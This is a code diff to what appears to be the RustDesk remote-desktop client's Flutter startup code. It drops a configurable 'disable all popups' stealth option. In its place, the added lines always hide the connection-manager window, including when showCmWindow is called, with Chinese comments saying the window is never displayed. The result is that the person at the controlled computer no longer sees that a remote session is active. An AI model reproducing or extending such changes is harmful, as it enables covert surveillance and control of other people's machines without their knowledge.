@@ -173,26 +173,15 @@ void runMainApp(bool startService) async {
     // Check the startup argument, if we successfully handle the argument, we keep the main window hidden.
     final handledByUniLinks = await initUniLinks();
     debugPrint("handled by uni links: $handledByUniLinks");
-    
-    // 根据配置决定是否屏蔽主窗口弹出
-    if (kDisableAllPopups) {
-      // 屏蔽主窗口弹出 - 始终隐藏主窗口
+    if (handledByUniLinks || handleUriLink(cmdArgs: kBootArgs)) {
       windowManager.hide();
-      // 设置窗口透明度为0，确保完全不可见
-      windowManager.setOpacity(0);
     } else {
-      // 原始行为
-      if (handledByUniLinks || handleUriLink(cmdArgs: kBootArgs)) {
-        windowManager.hide();
-        windowManager.setOpacity(1);
-      } else {
-        windowManager.show();
-        windowManager.focus();
-        // Move registration of active main window here to prevent from async visible check.
-        rustDeskWinManager.registerActiveWindow(kWindowMainId);
-        windowManager.setOpacity(1);
-      }
+      windowManager.show();
+      windowManager.focus();
+      // Move registration of active main window here to prevent from async visible check.
+      rustDeskWinManager.registerActiveWindow(kWindowMainId);
     }
+    windowManager.setOpacity(1);
     windowManager.setTitle(getWindowName());
     // Do not use `windowManager.setResizable()` here.
     setResizable(!bind.isIncomingOnly());
@@ -304,17 +293,8 @@ void runMultiWindow(
       // no such appType
       exit(0);
   }
-  
-  // 根据配置决定是否屏蔽多窗口弹出
-  if (kDisableAllPopups) {
-    // 屏蔽多窗口弹出 - 不显示窗口但保持功能运行
-    // 这样窗口在后台运行，用户看不到但功能正常
-    final windowController = WindowController.fromWindowId(kWindowId!);
-    await windowController.hide();
-  } else {
-    // 原始行为：显示窗口
-    WindowController.fromWindowId(kWindowId!).show();
-  }
+  // show window from hidden status
+  WindowController.fromWindowId(kWindowId!).show();
 }
 
 void runConnectionManagerScreen() async {
@@ -324,14 +304,10 @@ void runConnectionManagerScreen() async {
     const DesktopServerPage(),
     MyTheme.currentThemeMode(),
   );
-  // 根据全局配置决定是否屏蔽连接管理器窗口弹出
-  final bool hide = kDisableAllPopups || (await bind.cmGetConfig(name: "hide_cm") == 'true');
+  // 总是隐藏连接管理器窗口
+  final bool hide = true;
   gFFI.serverModel.hideCm = hide;
-  if (hide) {
-    await hideCmWindow(isStartup: true);
-  } else {
-    await showCmWindow(isStartup: true);
-  }
+  await hideCmWindow(isStartup: true);
   setResizable(false);
   // Start the uni links handler and redirect links to Native, not for Flutter.
   listenUniLinks(handleByFlutter: false);
@@ -345,43 +321,11 @@ showCmWindow({bool isStartup = false}) async {
         size: kConnectionManagerWindowSizeClosedChat, alwaysOnTop: true);
     await windowManager.waitUntilReadyToShow(windowOptions, null);
     bind.mainHideDock();
-    
-    // 根据配置决定是否屏蔽连接管理器窗口弹出
-    if (kDisableAllPopups) {
-      // 屏蔽连接管理器窗口弹出 - 即使调用showCmWindow也不显示
-      // 无感弹出：创建窗口但保持隐藏
-      await windowManager.hide();
-      await windowManager.setOpacity(0);
-    } else {
-      // 原始行为
-      await Future.wait([
-        windowManager.show(),
-        windowManager.focus(),
-        windowManager.setOpacity(1)
-      ]);
-    }
-    
-    // ensure initial window size to be changed
-    await windowManager.setSizeAlignment(
-        kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
-    _isCmReadyToShow = true;
+    // 即使调用showCmWindow，也不显示连接管理器窗口
+    await hideCmWindow(isStartup: true);
   } else if (_isCmReadyToShow) {
-    if (await windowManager.getOpacity() != 1) {
-      // 根据配置决定是否屏蔽连接管理器窗口显示
-      if (kDisableAllPopups) {
-        // 屏蔽显示，保持隐藏状态
-        await windowManager.setOpacity(0);
-        await windowManager.hide();
-      } else {
-        // 原始行为
-        await windowManager.setOpacity(1);
-        await windowManager.focus();
-        await windowManager.minimize(); //needed
-        await windowManager.setSizeAlignment(
-            kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
-        windowOnTop(null);
-      }
-    }
+    // 即使调用showCmWindow，也不显示连接管理器窗口
+    await hideCmWindow(isStartup: false);
   }
 }
 
@@ -446,18 +390,9 @@ void runInstallPage() async {
   WindowOptions windowOptions =
       getHiddenTitleBarWindowOptions(size: Size(800, 600), center: true);
   windowManager.waitUntilReadyToShow(windowOptions, () async {
-    // 根据配置决定是否屏蔽安装页面弹出
-    if (kDisableAllPopups) {
-      // 屏蔽安装页面弹出
-      // 无感弹出：隐藏安装页面但保持其运行
-      windowManager.hide();
-      windowManager.setOpacity(0);
-    } else {
-      // 原始行为
-      windowManager.show();
-      windowManager.focus();
-      windowManager.setOpacity(1);
-    }
+    windowManager.show();
+    windowManager.focus();
+    windowManager.setOpacity(1);
     windowManager.setAlignment(Alignment.center); // ensure
   });
 }
@@ -473,7 +408,7 @@ WindowOptions getHiddenTitleBarWindowOptions(
     defaultTitleBarStyle = TitleBarStyle.normal;
   }
   
-  // 主窗口强制设置固定尺寸
+        // 主窗口强制设置固定尺寸
   if (isMainWindow) {
     size = WINDOW_SIZE; // 覆盖所有传入的size参数
   }
